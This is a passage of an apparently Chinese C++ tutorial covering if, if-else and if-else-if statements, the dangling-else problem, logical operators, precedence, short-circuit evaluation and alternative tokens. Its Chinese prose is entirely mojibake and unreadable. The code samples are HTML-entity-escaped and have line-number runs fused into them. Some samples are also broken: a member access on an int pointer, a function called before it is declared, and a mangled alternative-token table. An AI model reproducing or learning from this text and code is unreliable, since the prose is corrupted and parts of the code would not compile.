&gt; 5, name == &quot;Alice&quot;ï¼‰æˆ–é€»è¾‘è¡¨è¾¾å¼ã€‚éé›¶å€¼è¢«è§†ä¸º trueï¼Œé›¶å€¼è¢«è§†ä¸º falseã€‚ &#123; ... &#125;: èŠ±æ‹¬å·å®šä¹‰äº†ä¸€ä¸ªè¯­å¥å—ã€‚å¦‚æœæ¡ä»¶ä¸º trueï¼Œåˆ™æ‰§è¡Œå—å†…çš„æ‰€æœ‰è¯­å¥ã€‚å¦‚æœåªæœ‰ä¸€æ¡è¯­å¥éœ€è¦æ ¹æ®æ¡ä»¶æ‰§è¡Œï¼Œå¯ä»¥çœç•¥èŠ±æ‹¬å·ï¼Œä½†ä¸ºäº†æ¸…æ™°å’Œé¿å…é”™è¯¯ï¼Œé€šå¸¸æ¨èæ€»æ˜¯ä½¿ç”¨èŠ±æ‹¬å·ã€‚ æ‰§è¡Œæµç¨‹: è®¡ç®— condition çš„å€¼ã€‚ å¦‚æœ condition ä¸º trueï¼Œæ‰§è¡Œ if è¯­å¥åé¢çš„è¯­å¥ï¼ˆæˆ–è¯­å¥å—ï¼‰ã€‚ å¦‚æœ condition ä¸º falseï¼Œè·³è¿‡ if è¯­å¥åé¢çš„è¯­å¥ï¼ˆæˆ–è¯­å¥å—ï¼‰ï¼Œç»§ç»­æ‰§è¡Œ if ç»“æ„ä¹‹åçš„ä»£ç ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int temperature; std::cout &lt;&lt; &quot;Enter the current temperature (Celsius): &quot;; std::cin &gt;&gt; temperature; // ç®€å•çš„ if è¯­å¥ if (temperature &gt; 30) &#123; std::cout &lt;&lt; &quot;It&#x27;s hot outside!&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Remember to stay hydrated.&quot; &lt;&lt; std::endl; &#125; if (temperature &lt; 10) std::cout &lt;&lt; &quot;It&#x27;s cold, wear a jacket!&quot; &lt;&lt; std::endl; // åªæœ‰ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥çœç•¥èŠ±æ‹¬å· std::cout &lt;&lt; &quot;Temperature check finished.&quot; &lt;&lt; std::endl; return 0;&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„ temperature å¤§äº 30ï¼Œä¼šæ‰“å°ä¸¤æ¡æ¶ˆæ¯ï¼›å¦‚æœå°äº 10ï¼Œä¼šæ‰“å°å¦ä¸€æ¡æ¶ˆæ¯ï¼›å¦åˆ™ï¼Œè¿™äº› if å—å†…çš„ä»£ç ä¼šè¢«è·³è¿‡ã€‚ 6.1.1 if elseè¯­å¥if è¯­å¥å…è®¸æˆ‘ä»¬åœ¨æ¡ä»¶ä¸ºçœŸæ—¶æ‰§è¡Œä»£ç ï¼Œä½†å¦‚æœæˆ‘ä»¬å¸Œæœ›åœ¨æ¡ä»¶ä¸ºå‡æ—¶æ‰§è¡Œå¦ä¸€æ®µä»£ç ï¼Œå°±éœ€è¦ä½¿ç”¨ if else ç»“æ„ã€‚ è¯­æ³•: 1234567if (condition) &#123; // å¦‚æœ condition ä¸º trueï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— (if block) statement_block_1;&#125; else &#123; // å¦‚æœ condition ä¸º falseï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— (else block) statement_block_2;&#125; æ‰§è¡Œæµç¨‹: è®¡ç®— condition çš„å€¼ã€‚ å¦‚æœ condition ä¸º trueï¼Œæ‰§è¡Œ if åé¢çš„è¯­å¥å— (statement_block_1)ï¼Œç„¶åè·³è¿‡ else åé¢çš„è¯­å¥å— (statement_block_2)ã€‚ å¦‚æœ condition ä¸º falseï¼Œè·³è¿‡ if åé¢çš„è¯­å¥å— (statement_block_1)ï¼Œæ‰§è¡Œ else åé¢çš„è¯­å¥å— (statement_block_2)ã€‚ æ‰§è¡Œå®Œé€‰æ‹©çš„å—åï¼Œç¨‹åºç»§ç»­æ‰§è¡Œ if else ç»“æ„ä¹‹åçš„ä»£ç ã€‚ å…³é”®ç‚¹: if å—å’Œ else å—æ˜¯äº’æ–¥çš„ï¼Œç¨‹åºåªä¼šæ‰§è¡Œå…¶ä¸­ä¸€ä¸ªã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819#include &lt;iostream&gt;int main() &#123; int age; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; if (age &gt;= 18) &#123; std::cout &lt;&lt; &quot;You are eligible to vote.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;You are not yet eligible to vote.&quot; &lt;&lt; std::endl; int years_to_wait = 18 - age; std::cout &lt;&lt; &quot;You need to wait &quot; &lt;&lt; years_to_wait &lt;&lt; &quot; more year(s).&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Age check complete.&quot; &lt;&lt; std::endl; return 0;&#125; è¿™ä¸ªç¨‹åºä¼šæ ¹æ®ç”¨æˆ·è¾“å…¥çš„å¹´é¾„ï¼Œæ‰“å°ä¸¤æ¡ä¸åŒçš„æ¶ˆæ¯ä¹‹ä¸€ã€‚ 6.1.2 æ ¼å¼åŒ–if elseè¯­å¥æ¸…æ™°çš„ä»£ç æ ¼å¼å¯¹äºå¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§è‡³å…³é‡è¦ã€‚å¯¹äº if else è¯­å¥ï¼Œæ¨èéµå¾ªä»¥ä¸‹æ ¼å¼åŒ–çº¦å®šï¼š ä½¿ç”¨èŠ±æ‹¬å· &#123;&#125;: å³ä½¿ if æˆ– else åé¢åªæœ‰ä¸€æ¡è¯­å¥ï¼Œä¹Ÿæ¨èä½¿ç”¨èŠ±æ‹¬å·ã€‚è¿™å¯ä»¥é˜²æ­¢åœ¨åç»­æ·»åŠ ä»£ç æ—¶å¼•å…¥æ‚¬æŒ‚ else (dangling else) ç­‰é”™è¯¯ï¼Œå¹¶ä½¿ä»£ç ç»“æ„æ›´æ¸…æ™°ã€‚ ç¼©è¿›: if å’Œ else å—å†…éƒ¨çš„è¯­å¥åº”è¯¥ç›¸å¯¹äº if å’Œ else å…³é”®å­—è¿›è¡Œç¼©è¿›ï¼ˆé€šå¸¸æ˜¯ 4 ä¸ªç©ºæ ¼æˆ–ä¸€ä¸ªåˆ¶è¡¨ç¬¦ï¼‰ã€‚ else çš„ä½ç½®: else å…³é”®å­—é€šå¸¸ä¸å¯¹åº”çš„ if è¯­å¥çš„å³èŠ±æ‹¬å· &#125; æ”¾åœ¨åŒä¸€è¡Œï¼Œæˆ–è€…å•ç‹¬æ”¾åœ¨ä¸‹ä¸€è¡Œå¹¶ä¸ if å¯¹é½ã€‚ä¸¤ç§é£æ ¼éƒ½å¾ˆå¸¸è§ã€‚ ç¤ºä¾‹ (æ¨èçš„æ ¼å¼): 123456789101112131415161718192021222324// é£æ ¼ 1: else ä¸ if çš„ &#125; åœ¨åŒä¸€è¡Œif (condition) &#123; // ... statements ...&#125; else &#123; // ... statements ...&#125;// é£æ ¼ 2: else å•ç‹¬ä¸€è¡Œï¼Œä¸ if å¯¹é½if (condition) &#123; // ... statements ...&#125; else &#123; // ... statements ...&#125;// ä¸æ¨èçš„æ ¼å¼ (å³ä½¿åªæœ‰ä¸€æ¡è¯­å¥)// if (condition) statement1; else statement2; // å¯è¯»æ€§å·®ï¼Œæ˜“å‡ºé”™// æ¨èçš„æ ¼å¼ (å³ä½¿åªæœ‰ä¸€æ¡è¯­å¥)if (condition) &#123; statement1;&#125; else &#123; statement2;&#125; æ‚¬æŒ‚ else é—®é¢˜: å½“ if è¯­å¥åµŒå¥—ä¸”çœç•¥èŠ±æ‹¬å·æ—¶ï¼Œelse ä¼šä¸æœ€è¿‘çš„æœªåŒ¹é…çš„ if ç›¸å…³è”ï¼Œè¿™å¯èƒ½ä¸ç¬¦åˆé¢„æœŸã€‚ 123456789101112131415161718int a = 1, b = -1;// é”™è¯¯çš„æ„å›¾ (å¯èƒ½æƒ³è®© else å¯¹åº”å¤–å±‚ if)if (a &gt; 0) if (b &gt; 0) std::cout &lt;&lt; &quot;Both positive&quot;;else // è¿™ä¸ª else å®é™…ä¸Šå¯¹åº”çš„æ˜¯ if (b &gt; 0) std::cout &lt;&lt; &quot;a is not positive&quot;; // è¿™è¡Œä¸ä¼šæŒ‰é¢„æœŸæ‰§è¡Œ// æ­£ç¡®çš„å†™æ³• (ä½¿ç”¨èŠ±æ‹¬å·æ˜ç¡®å…³è”)if (a &gt; 0) &#123; // å¤–å±‚ if if (b &gt; 0) &#123; // å†…å±‚ if std::cout &lt;&lt; &quot;Both positive&quot;; &#125; // æ²¡æœ‰ else å¯¹åº”å†…å±‚ if&#125; else &#123; // è¿™ä¸ª else å¯¹åº”å¤–å±‚ if (a &gt; 0) std::cout &lt;&lt; &quot;a is not positive&quot;; &#125; å§‹ç»ˆä½¿ç”¨èŠ±æ‹¬å·å¯ä»¥å®Œå…¨é¿å…æ‚¬æŒ‚ else é—®é¢˜ã€‚ 6.1.3 if else if elseç»“æ„å½“éœ€è¦ä»å¤šä¸ªäº’æ–¥çš„é€‰é¡¹ä¸­é€‰æ‹©ä¸€ä¸ªæ‰§è¡Œè·¯å¾„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ if else if else ç»“æ„ã€‚å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ç³»åˆ—åµŒå¥—çš„ if else è¯­å¥ï¼Œä½†é€šå¸¸å†™æˆæ›´æ‰å¹³çš„ç»“æ„ã€‚ è¯­æ³•: 123456789101112131415if (condition1) &#123; // å¦‚æœ condition1 ä¸º trueï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— statement_block_1;&#125; else if (condition2) &#123; // å¦‚æœ condition1 ä¸º false ä¸” condition2 ä¸º trueï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— statement_block_2;&#125; else if (condition3) &#123; // å¦‚æœ condition1 å’Œ condition2 éƒ½ä¸º false ä¸” condition3 ä¸º trueï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— statement_block_3;&#125; // ... å¯ä»¥æœ‰æ›´å¤šçš„ else if åˆ†æ”¯else &#123; // å¦‚æœä»¥ä¸Šæ‰€æœ‰æ¡ä»¶éƒ½ä¸º falseï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— (å¯é€‰çš„é»˜è®¤åˆ†æ”¯) statement_block_default;&#125; æ‰§è¡Œæµç¨‹: ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ£€æŸ¥æ¯ä¸ª if å’Œ else if çš„æ¡ä»¶ã€‚ ä¸€æ—¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªä¸º true çš„æ¡ä»¶ï¼Œå°±æ‰§è¡Œå…¶å¯¹åº”çš„è¯­å¥å—ã€‚ æ‰§è¡Œå®Œè¯¥å—åï¼Œè·³è¿‡æ‰€æœ‰å‰©ä½™çš„ else if å’Œ else åˆ†æ”¯ï¼Œç›´æ¥æ‰§è¡Œæ•´ä¸ª if else if else ç»“æ„ä¹‹åçš„ä»£ç ã€‚ å¦‚æœæ‰€æœ‰çš„ if å’Œ else if æ¡ä»¶éƒ½ä¸º falseï¼Œåˆ™æ‰§è¡Œæœ€åçš„ else å—ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚å¦‚æœä¸å­˜åœ¨æœ€åçš„ else å—ï¼Œåˆ™æ•´ä¸ªç»“æ„ä»€ä¹ˆä¹Ÿä¸æ‰§è¡Œã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; int score; std::cout &lt;&lt; &quot;Enter your numerical score (0-100): &quot;; std::cin &gt;&gt; score; char grade; if (score &lt; 0 || score &gt; 100) &#123; std::cout &lt;&lt; &quot;Invalid score entered.&quot; &lt;&lt; std::endl; grade = &#x27;I&#x27;; // Invalid &#125; else if (score &gt;= 90) &#123; grade = &#x27;A&#x27;; &#125; else if (score &gt;= 80) &#123; grade = &#x27;B&#x27;; &#125; else if (score &gt;= 70) &#123; grade = &#x27;C&#x27;; &#125; else if (score &gt;= 60) &#123; grade = &#x27;D&#x27;; &#125; else &#123; // score &lt; 60 grade = &#x27;F&#x27;; &#125; if (grade != &#x27;I&#x27;) &#123; std::cout &lt;&lt; &quot;Your grade is: &quot; &lt;&lt; grade &lt;&lt; std::endl; &#125; return 0;&#125; è¿™ä¸ªä¾‹å­æ ¹æ®åˆ†æ•°èŒƒå›´åˆ¤æ–­å¯¹åº”çš„ç­‰çº§ã€‚ç¨‹åºä¼šæŒ‰é¡ºåºæ£€æŸ¥æ¡ä»¶ï¼Œä¸€æ—¦æ»¡è¶³ä¸€ä¸ªï¼ˆä¾‹å¦‚ score &gt;= 80ï¼‰ï¼Œå°±ä¼šç¡®å®šç­‰çº§ä¸º â€˜Bâ€™ï¼Œå¹¶è·³è¿‡åç»­çš„ else if å’Œ elseã€‚æœ€åçš„ else å¤„ç†æ‰€æœ‰ä½äº 60 åˆ†çš„æƒ…å†µã€‚ 6.2 é€»è¾‘è¡¨è¾¾å¼åœ¨ if æˆ–å¾ªç¯çš„æ¡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸éœ€è¦ç»„åˆå¤šä¸ªå…³ç³»è¡¨è¾¾å¼æˆ–è€…å¯¹æŸä¸ªæ¡ä»¶å–åã€‚é€»è¾‘è¿ç®—ç¬¦ (Logical Operators) ç”¨äºç»„åˆæˆ–ä¿®æ”¹å·²æœ‰çš„å¸ƒå°”è¡¨è¾¾å¼ï¼ˆæˆ–å¯ä»¥è½¬æ¢ä¸ºå¸ƒå°”å€¼çš„è¡¨è¾¾å¼ï¼‰ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å¸ƒå°”ç»“æœ (true æˆ– false)ã€‚ C++ ä¸»è¦æä¾›ä¸‰ç§é€»è¾‘è¿ç®—ç¬¦ï¼š é€»è¾‘æˆ– (Logical OR): || é€»è¾‘ä¸ (Logical AND): &amp;&amp; é€»è¾‘é (Logical NOT): ! 6.2.1 é€»è¾‘ORè¿ç®—ç¬¦ï¼š||é€»è¾‘æˆ–è¿ç®—ç¬¦ || ç”¨äºè¿æ¥ä¸¤ä¸ªè¡¨è¾¾å¼ã€‚å¦‚æœè‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸º trueï¼Œåˆ™æ•´ä¸ª || è¡¨è¾¾å¼çš„ç»“æœä¸º trueã€‚åªæœ‰å½“ä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸º false æ—¶ï¼Œç»“æœæ‰ä¸º falseã€‚ çœŸå€¼è¡¨: | æ“ä½œæ•°1 | æ“ä½œæ•°2 | æ“ä½œæ•°1 || æ“ä½œæ•°2 || :â€”â€” | :â€”â€” | :â€”â€”â€”â€”â€”â€”- || true | true | true || true | false | true || false | true | true || false | false | false | ç”¨æ³•ä¸ç¤ºä¾‹: || å¸¸ç”¨äºæ£€æŸ¥å¤šä¸ªæ¡ä»¶ä¸­æ˜¯å¦è‡³å°‘æœ‰ä¸€ä¸ªæ»¡è¶³ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; char input_char; std::cout &lt;&lt; &quot;Enter a character: &quot;; std::cin &gt;&gt; input_char; // æ£€æŸ¥å­—ç¬¦æ˜¯å¦æ˜¯å…ƒéŸ³å­—æ¯ (å¿½ç•¥å¤§å°å†™) if (input_char == &#x27;a&#x27; || input_char == &#x27;e&#x27; || input_char == &#x27;i&#x27; || input_char == &#x27;o&#x27; || input_char == &#x27;u&#x27; || input_char == &#x27;A&#x27; || input_char == &#x27;E&#x27; || input_char == &#x27;I&#x27; || input_char == &#x27;O&#x27; || input_char == &#x27;U&#x27;) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; input_char &lt;&lt; &quot;&#x27; is a vowel.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; input_char &lt;&lt; &quot;&#x27; is not a vowel.&quot; &lt;&lt; std::endl; &#125; int age = 25; bool has_ticket = false; // æ£€æŸ¥æ˜¯å¦æ»¡è¶³å…¥åœºæ¡ä»¶ (å¹´é¾„å°äº 12 æˆ–æŒæœ‰é—¨ç¥¨) if (age &lt; 12 || has_ticket) &#123; std::cout &lt;&lt; &quot;Allowed entry.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Entry denied.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 6.2.2 é€»è¾‘ANDè¿ç®—ç¬¦ï¼š&amp;&amp;é€»è¾‘ä¸è¿ç®—ç¬¦ &amp;&amp; ç”¨äºè¿æ¥ä¸¤ä¸ªè¡¨è¾¾å¼ã€‚åªæœ‰å½“ä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸º true æ—¶ï¼Œæ•´ä¸ª &amp;&amp; è¡¨è¾¾å¼çš„ç»“æœæ‰ä¸º trueã€‚åªè¦æœ‰è‡³å°‘ä¸€ä¸ªæ“ä½œæ•°ä¸º falseï¼Œç»“æœå°±ä¸º falseã€‚ çœŸå€¼è¡¨: æ“ä½œæ•°1 æ“ä½œæ•°2 æ“ä½œæ•°1 &amp;&amp; æ“ä½œæ•°2 true true true true false false false true false false false false ç”¨æ³•ä¸ç¤ºä¾‹: &amp;&amp; å¸¸ç”¨äºæ£€æŸ¥æ˜¯å¦åŒæ—¶æ»¡è¶³å¤šä¸ªæ¡ä»¶ã€‚ 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int age; bool has_id; char id_input; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; std::cout &lt;&lt; &quot;Do you have an ID? (y/n): &quot;; std::cin &gt;&gt; id_input; has_id = (id_input == &#x27;y&#x27; || id_input == &#x27;Y&#x27;); // æ£€æŸ¥æ˜¯å¦æ»¡è¶³è´­ä¹°æ¡ä»¶ (å¹´é¾„å¤§äºç­‰äº 18 å¹¶ä¸”æŒæœ‰ ID) if (age &gt;= 18 &amp;&amp; has_id) &#123; std::cout &lt;&lt; &quot;Purchase approved.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Purchase denied.&quot; &lt;&lt; std::endl; if (age &lt; 18) &#123; std::cout &lt;&lt; &quot;Reason: Underage.&quot; &lt;&lt; std::endl; &#125; if (!has_id) &#123; // ä½¿ç”¨äº†é€»è¾‘é ! std::cout &lt;&lt; &quot;Reason: No ID presented.&quot; &lt;&lt; std::endl; &#125; &#125; return 0;&#125; 6.2.3 ç”¨&amp;&amp;æ¥è®¾ç½®å–å€¼èŒƒå›´é€»è¾‘ä¸è¿ç®—ç¬¦ &amp;&amp; éå¸¸é€‚åˆç”¨æ¥æ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦è½åœ¨æŸä¸ªç‰¹å®šçš„èŒƒå›´å†…ï¼ˆå³åŒæ—¶æ»¡è¶³å¤§äºæŸä¸ªå€¼å’Œå°äºå¦ä¸€ä¸ªå€¼ï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; int score; std::cout &lt;&lt; &quot;Enter your score: &quot;; std::cin &gt;&gt; score; // æ£€æŸ¥åˆ†æ•°æ˜¯å¦åœ¨æœ‰æ•ˆèŒƒå›´ [0, 100] å†… if (score &gt;= 0 &amp;&amp; score &lt;= 100) &#123; std::cout &lt;&lt; &quot;Score is valid.&quot; &lt;&lt; std::endl; // è¿›ä¸€æ­¥åˆ¤æ–­ç­‰çº§ if (score &gt;= 60 &amp;&amp; score &lt; 70) &#123; std::cout &lt;&lt; &quot;Grade: D&quot; &lt;&lt; std::endl; &#125; else if (score &gt;= 70 &amp;&amp; score &lt; 80) &#123; std::cout &lt;&lt; &quot;Grade: C&quot; &lt;&lt; std::endl; &#125; // ... å…¶ä»–ç­‰çº§åˆ¤æ–­ &#125; else &#123; std::cout &lt;&lt; &quot;Score is invalid (out of range 0-100).&quot; &lt;&lt; std::endl; &#125; // æ£€æŸ¥ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯å¤§å†™å­—æ¯ char ch = &#x27;Q&#x27;; if (ch &gt;= &#x27;A&#x27; &amp;&amp; ch &lt;= &#x27;Z&#x27;) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is an uppercase letter.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; æ³¨æ„: ä¸èƒ½åƒæ•°å­¦ä¸­é‚£æ ·å†™ 0 &lt;= score &lt;= 100ã€‚è¿™åœ¨ C++ ä¸­ä¼šè¢«è§£é‡Šä¸º (0 &lt;= score) &lt;= 100ã€‚(0 &lt;= score) çš„ç»“æœæ˜¯ true (1) æˆ– false (0)ï¼Œç„¶åè¿™ä¸ª 0 æˆ– 1 å†ä¸ 100 æ¯”è¾ƒï¼Œç»“æœå‡ ä¹æ€»æ˜¯ trueï¼Œæ— æ³•æ­£ç¡®åˆ¤æ–­èŒƒå›´ã€‚å¿…é¡»ä½¿ç”¨ &amp;&amp; è¿æ¥ä¸¤ä¸ªç‹¬ç«‹çš„æ¯”è¾ƒã€‚ 6.2.4 é€»è¾‘NOTè¿ç®—ç¬¦ï¼š!é€»è¾‘éè¿ç®—ç¬¦ ! æ˜¯ä¸€ä¸ªä¸€å…ƒè¿ç®—ç¬¦ï¼ˆåªéœ€è¦ä¸€ä¸ªæ“ä½œæ•°ï¼‰ã€‚å®ƒå°†å…¶æ“ä½œæ•°çš„å¸ƒå°”å€¼å–åï¼šå¦‚æœæ“ä½œæ•°ä¸º trueï¼Œç»“æœä¸º falseï¼›å¦‚æœæ“ä½œæ•°ä¸º falseï¼Œç»“æœä¸º trueã€‚ çœŸå€¼è¡¨: æ“ä½œæ•° !æ“ä½œæ•° true false false true ç”¨æ³•ä¸ç¤ºä¾‹: ! ç”¨äºåè½¬ä¸€ä¸ªæ¡ä»¶çš„ç»“æœã€‚ 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; bool is_raining = false; int items_in_cart = 0; // å¦‚æœä¸æ˜¯åœ¨ä¸‹é›¨ if (!is_raining) &#123; std::cout &lt;&lt; &quot;It&#x27;s not raining. Good day for a walk!&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;It&#x27;s raining. Better stay inside.&quot; &lt;&lt; std::endl; &#125; // æ£€æŸ¥è´­ç‰©è½¦æ˜¯å¦ä¸ºç©º // items_in_cart == 0 ä¹Ÿå¯ä»¥ï¼Œä½† !items_in_cart æ›´ç®€æ´ (åˆ©ç”¨ 0 è½¬æ¢ä¸º false) if (!items_in_cart) &#123; std::cout &lt;&lt; &quot;Your shopping cart is empty.&quot; &lt;&lt; std::endl; &#125; // æ£€æŸ¥ cin è¯»å–æ˜¯å¦å¤±è´¥ int value; std::cout &lt;&lt; &quot;Enter a number: &quot;; if (!(std::cin &gt;&gt; value)) &#123; // å¦‚æœè¯»å–å¤±è´¥ (cin è½¬æ¢ä¸º false), !cin ä¸º true std::cout &lt;&lt; &quot;Invalid input or EOF.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; value &lt;&lt; std::endl; &#125; return 0;&#125; 6.2.5 é€»è¾‘è¿ç®—ç¬¦ç»†èŠ‚ ä¼˜å…ˆçº§ (Precedence): é€»è¾‘é ! å…·æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§ï¼Œé«˜äºæ‰€æœ‰å…³ç³»è¿ç®—ç¬¦å’Œç®—æœ¯è¿ç®—ç¬¦ã€‚ é€»è¾‘ä¸ &amp;&amp; çš„ä¼˜å…ˆçº§é«˜äºé€»è¾‘æˆ– ||ã€‚ é€»è¾‘è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ä½äºå…³ç³»è¿ç®—ç¬¦ (&lt;, ==, != ç­‰)ã€‚ èµ‹å€¼è¿ç®—ç¬¦ (=) ä¼˜å…ˆçº§æœ€ä½ã€‚ *å¸¸è§ä¼˜å…ˆçº§é¡ºåº (é«˜åˆ°ä½):** ! ç®—æœ¯è¿ç®—ç¬¦ (*, /, %, +, -) å…³ç³»è¿ç®—ç¬¦ (&lt;, &lt;=, &gt;, &gt;=) ç›¸ç­‰è¿ç®—ç¬¦ (==, !=) é€»è¾‘ä¸ &amp;&amp; é€»è¾‘æˆ– || èµ‹å€¼è¿ç®—ç¬¦ (=, += ç­‰) å»ºè®®: å½“ä¸ç¡®å®šä¼˜å…ˆçº§æˆ–ä¸ºäº†æé«˜å¯è¯»æ€§æ—¶ï¼Œä½¿ç”¨æ‹¬å· () æ¥æ˜ç¡®æŒ‡å®šè¿ç®—é¡ºåºã€‚ 1if ((age &gt;= 18 &amp;&amp; age &lt; 65) || is_student) &#123; ... &#125; // æ‹¬å·æ˜ç¡®äº† &amp;&amp; å…ˆäº || çŸ­è·¯æ±‚å€¼ (Short-Circuit Evaluation): &amp;&amp; (é€»è¾‘ä¸): å¦‚æœ &amp;&amp; çš„å·¦ä¾§æ“ä½œæ•°è®¡ç®—ç»“æœä¸º falseï¼Œåˆ™å³ä¾§æ“ä½œæ•°ä¸ä¼šè¢«è®¡ç®—ã€‚å› ä¸ºæ— è®ºå³ä¾§æ˜¯ä»€ä¹ˆï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœéƒ½å¿…ç„¶æ˜¯ falseã€‚ || (é€»è¾‘æˆ–): å¦‚æœ || çš„å·¦ä¾§æ“ä½œæ•°è®¡ç®—ç»“æœä¸º trueï¼Œåˆ™å³ä¾§æ“ä½œæ•°ä¸ä¼šè¢«è®¡ç®—ã€‚å› ä¸ºæ— è®ºå³ä¾§æ˜¯ä»€ä¹ˆï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœéƒ½å¿…ç„¶æ˜¯ trueã€‚ çŸ­è·¯æ±‚å€¼éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒï¼š æé«˜æ•ˆç‡: é¿å…äº†ä¸å¿…è¦çš„è®¡ç®—ã€‚ å…è®¸å®‰å…¨æ£€æŸ¥: å¯ä»¥åœ¨æ£€æŸ¥æŒ‡é’ˆæœ‰æ•ˆæ€§åæ‰è§£å¼•ç”¨å®ƒï¼Œæˆ–åœ¨é™¤æ•°éé›¶æ—¶æ‰æ‰§è¡Œé™¤æ³•ã€‚ *çŸ­è·¯æ±‚å€¼ç¤ºä¾‹:** 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;int main() &#123; int divisor = 0; int value = 10; // å®‰å…¨çš„é™¤æ³•æ£€æŸ¥ (å› ä¸º divisor ä¸º 0ï¼Œå³ä¾§ä¸ä¼šæ‰§è¡Œ) if (divisor != 0 &amp;&amp; value / divisor &gt; 1) &#123; std::cout &lt;&lt; &quot;Result is greater than 1.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Divisor is zero or result is not greater than 1.&quot; &lt;&lt; std::endl; &#125; int *ptr = nullptr; // å®‰å…¨çš„æŒ‡é’ˆè®¿é—® (å› ä¸º ptr ä¸º nullptrï¼Œå³ä¾§ä¸ä¼šæ‰§è¡Œ) if (ptr != nullptr &amp;&amp; ptr-&gt;some_member == 5) &#123; std::cout &lt;&lt; &quot;Pointer member is 5.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Pointer is null or member is not 5.&quot; &lt;&lt; std::endl; &#125; int count = 0; // || çš„çŸ­è·¯ (å› ä¸º ++count &gt; 0 ä¸º trueï¼Œå³ä¾§ä¸ä¼šæ‰§è¡Œ) if (++count &gt; 0 || some_expensive_function()) &#123; std::cout &lt;&lt; &quot;Condition met. Count is &quot; &lt;&lt; count &lt;&lt; std::endl; // count å˜ä¸º 1 &#125; return 0;&#125;bool some_expensive_function() &#123; std::cout &lt;&lt; &quot;Expensive function called!&quot; &lt;&lt; std::endl; // è¿™è¡Œä¸ä¼šè¢«æ‰“å° return true;&#125; 6.2.6 å…¶ä»–è¡¨ç¤ºæ–¹å¼ä¸ºäº†å…¼å®¹æŸäº›å¯èƒ½ç¼ºå°‘ |, &amp;, ! å­—ç¬¦çš„é”®ç›˜æˆ–å­—ç¬¦é›†ï¼ŒC++ æ ‡å‡†å®šä¹‰äº†ä¸€äº›æ›¿ä»£è¡¨ç¤ºï¼ˆä¹Ÿç§°ä¸º â€œdigraphsâ€ æˆ– â€œalternative tokensâ€ï¼‰ã€‚è¿™äº›æ˜¯å…³é”®å­—ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ— éœ€åŒ…å«ç‰¹æ®Šå¤´æ–‡ä»¶ã€‚ é€»è¾‘è¿ç®—ç¬¦ æ›¿ä»£è¡¨ç¤º &amp;&amp; and ` ! not &amp;= and_eq ` =` ^= xor_eq ~ compl &amp; bitand ` ` ^ xor != not_eq ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; int x = 5, y = 10; bool flag = false; // ä½¿ç”¨æ›¿ä»£è¡¨ç¤º if (x &gt; 0 and y &lt; 20) &#123; // ç­‰ä»·äº x &gt; 0 &amp;&amp; y &lt; 20 std::cout &lt;&lt; &quot;Condition (and) is true.&quot; &lt;&lt; std::endl; &#125; if (x &lt; 0 or y == 10) &#123; // ç­‰ä»·äº x &lt; 0 || y == 10 std::cout &lt;&lt; &quot;Condition (or) is true.&quot; 